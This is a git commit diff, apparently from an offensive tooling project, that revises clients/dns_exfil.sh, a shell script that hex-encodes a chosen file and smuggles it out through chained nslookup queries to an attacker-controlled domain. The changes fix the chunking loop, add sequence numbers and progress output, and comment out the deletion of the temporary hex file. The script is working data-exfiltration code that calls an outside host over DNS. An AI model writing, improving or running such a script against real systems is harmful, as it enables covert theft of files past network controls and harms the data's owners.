ca8ead52eea1d233c590db98d72411300e6400f3
Jordan Chadwick <jordan.chadwick@gmail.com>
2020-03-17 10:19:26 -0400

    fixes

--- clients/dns_exfil.sh
+++ clients/dns_exfil.sh
@@ -21,16 +21,21 @@ encoded_file=$(base64 /dev/urandom | tr -dc '[:alnum:]' | head -c 20)
 if [ -f "$file" ]; then
     echo "[*] exfiltrating file $file"
     hexdump -ve '1/1 "%.2x"' "$file" > $encoded_file.hex
-    encoded_bytes=$(wc -c $encoded_file.hex)
+    encoded_bytes=$(cat $encoded_file.hex | wc -c)
+    echo "$encoded_bytes bytes"
     tail_offset=$encoded_bytes
     count=0
     while [ $tail_offset -ge 0 ]; do
-        ex=$(tail -c $tail_offset | head -c 63)
-        nslookup $ex."$domain"
-        tail_offset=$[$tail_offset-63]
+        count_length=$[${#count}+1]
+        data_length=$[63-$count_length]
+        ex=$(tail -c $tail_offset $encoded_file.hex | head -c $data_length)
+        echo "sent $count-$ex [$tail_offset left]"
+        nslookup $count"-"$ex."$domain"
+        tail_offset=$[$tail_offset-$data_length]
+        count=$[$count+1]
     done
     echo "[+] exfiltration done"
-    rm $encoded_file.hex
+    # rm $encoded_file.hex
 
 else
     echo "[-] file $file does not exist or is a directory"
